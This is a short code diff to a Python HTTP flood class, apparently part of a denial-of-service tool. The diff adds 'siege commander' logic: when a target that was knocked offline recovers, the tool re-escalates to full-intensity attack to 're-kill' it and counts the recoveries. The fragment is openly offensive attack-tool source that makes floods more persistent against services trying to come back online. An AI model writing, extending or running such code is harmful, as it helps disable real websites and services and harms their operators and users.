@@ -1655,6 +1655,18 @@ class HttpFlood(Thread):
             intel["attack_phases_completed"].append("SUSTAIN")
             print(f"{bcolors.OKGREEN}[SIEGE COMMANDER] SUSTAINED ASSAULT SUCCESSFUL. Entering PILLAGE.{bcolors.RESET}")
 
+        # [V52.4] AUTO-RECOVERY DETECTION: If target was down (PILLAGE) but now alive, re-escalate
+        elif phase == "PILLAGE" and not intel.get("target_is_down") and not intel.get("target_getting_weaker"):
+            # Target has recovered! Re-escalate to BREACH immediately
+            intel["siege_phase"] = "BREACH"
+            intel["siege_doctrine"] = {
+                "objective": "TARGET RECOVERED! Re-engaging maximum force to re-kill.",
+                "intensity": 1.0,
+                "stealth_priority": False
+            }
+            intel["recovery_count"] = intel.get("recovery_count", 0) + 1
+            print(f"{bcolors.FAIL}[SIEGE COMMANDER] TARGET RECOVERED! Re-escalating to BREACH (Recovery #{intel['recovery_count']}). FULL FORCE RE-ENGAGED.{bcolors.RESET}")
+
         # Apply siege intensity to temperature
         doctrine = intel.get("siege_doctrine", {})
         if doctrine:
